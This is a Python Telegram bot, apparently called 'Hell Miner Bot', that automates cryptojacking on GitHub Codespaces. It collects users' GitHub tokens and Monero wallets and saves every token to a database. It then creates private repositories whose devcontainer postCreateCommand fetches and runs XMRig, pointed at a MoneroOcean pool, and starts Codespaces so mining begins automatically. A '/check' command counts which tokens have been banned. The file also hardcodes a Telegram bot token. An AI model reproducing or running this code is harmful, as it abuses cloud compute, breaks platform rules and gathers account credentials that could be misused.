import os
import time
import sqlite3
import requests
import base64
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = "7803505654:AAHkF650Qd6bF8jlDpAT-AFN4u9swpFee_I"

conn = sqlite3.connect("data.db", check_same_thread=False)
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, wallet TEXT)")
c.execute("CREATE TABLE IF NOT EXISTS tokens (user_id INTEGER, token TEXT)")
conn.commit()

def upload_file(token, username, repo, filename, content):
    encoded = base64.b64encode(content.encode()).decode()
    try:
        return requests.put(
            f"https://api.github.com/repos/{username}/{repo}/contents/{filename}",
            headers={"Authorization": f"token {token}"},
            json={"message": f"Add {filename}", "content": encoded, "branch": "main"},
            timeout=10
        )
    except:
        return None

def create_two_repos_and_codespaces(github_token, wallet, update=None):
    headers = {
        "Authorization": f"token {github_token}",
        "Accept": "application/vnd.github+json"
    }
    try:
        user_info = requests.get("https://api.github.com/user", headers=headers, timeout=10).json()
    except:
        return None, False

    username = user_info.get("login")
    if not username:
        return None, False

    files = {
        "devcontainer.json": '''{
  "name": "XMRig Codespace",
  "postCreateCommand": "chmod +x c9ep7c.sh && ./c9ep7c.sh"
}''',
        "c9ep7c.sh": f'''#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz
tar -xvf xmrig-6.21.1-linux-x64.tar.gz
cd xmrig-6.21.1
chmod +x xmrig
./xmrig -o gulf.moneroocean.stream:10128 -u {wallet} -p codespace --donate-level 1 --threads 4
''',
        "README.md": "# Auto mining repo"
    }

    for i in range(2):
        repo_name = f"xmrig-{os.urandom(3).hex()}"
        try:
            repo_resp = requests.post(
                "https://api.github.com/repos/github/codespaces-blank/generate",
                headers=headers,
                json={
                    "owner": username,
                    "name": repo_name,
                    "private": True
                },
                timeout=10
            )
        except:
            if update:
                update.message.reply_text(f"❌ Failed to create repo {i+1}")
            continue

        if repo_resp.status_code != 201:
            if update:
                update.message.reply_text(f"❌ Repo {i+1} creation failed ({repo_resp.status_code})")
            continue

        for fname, content in files.items():
            upload_file(github_token, username, repo_name, fname, content)

        time.sleep(6)

        try:
            repo_data = requests.get(f"https://api.github.com/repos/{username}/{repo_name}", headers=headers, timeout=10).json()
            repo_id = repo_data.get("id")
            if not repo_id:
                continue

            resp = requests.post(
                "https://api.github.com/user/codespaces",
                headers=headers,
                json={"repository_id": repo_id, "ref": "main"},
                timeout=10
            )
            if update:
                update.message.reply_text(f"📦 Codespace {i+1}: {resp.status_code}")
        except:
            continue

    return username, True

async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /wallet <XMR_wallet>")
        return
    wallet = context.args[0]
    c.execute("INSERT OR REPLACE INTO users (user_id, wallet) VALUES (?, ?)", (user_id, wallet))
    conn.commit()
    await update.message.reply_text("✅ Wallet saved! You're ready to mine.")

async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("❌ Usage: /token <GitHub_token_1> <GitHub_token_2> ...")
        return
    c.execute("SELECT wallet FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    if not row:
        await update.message.reply_text("⚠️ First set your wallet using /wallet")
        return
    wallet = row[0]

    reply = ""
    for github_token in context.args:
        c.execute("INSERT INTO tokens (user_id, token) VALUES (?, ?)", (user_id, github_token))
        conn.commit()
        username, success = create_two_repos_and_codespaces(github_token, wallet, update)
        if success:
            reply += f"😈 Logged in as: {username}\n✅ Codespaces started with mining...\n\n"
        else:
            reply += f"❌ Token {github_token[:8]}... is invalid or failed\n\n"

    await update.message.reply_text(reply.strip())

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    c.execute("SELECT token FROM tokens WHERE user_id = ?", (user_id,))
    tokens = c.fetchall()
    active = banned = 0
    for (token,) in tokens:
        try:
            res = requests.get("https://api.github.com/user", headers={"Authorization": f"token {token}"}, timeout=6)
            if res.status_code == 200:
                active += 1
            else:
                banned += 1
        except:
            banned += 1
    total = active + banned
    await update.message.reply_text(
        f"👤 GitHub Token Status\n━━━━━━━━━━━━━━━\n✅ Active: {active}\n❌ Banned: {banned}\n💾 Total: {total}"
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "😈 WELCOME TO HELL MINER BOT 😈\n\n"
        "📖 HOW TO MINE:\n"
        "1️⃣ /wallet <your_monero_wallet>\n"
        "2️⃣ /token <your_github_token>\n"
        "3️⃣ Sit back and mine\n"
        "4️⃣ /check - Token status\n"
    )

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("wallet", wallet))
app.add_handler(CommandHandler("token", token))
app.add_handler(CommandHandler("check", check))
app.add_handler(CommandHandler("start", start))
app.run_polling()
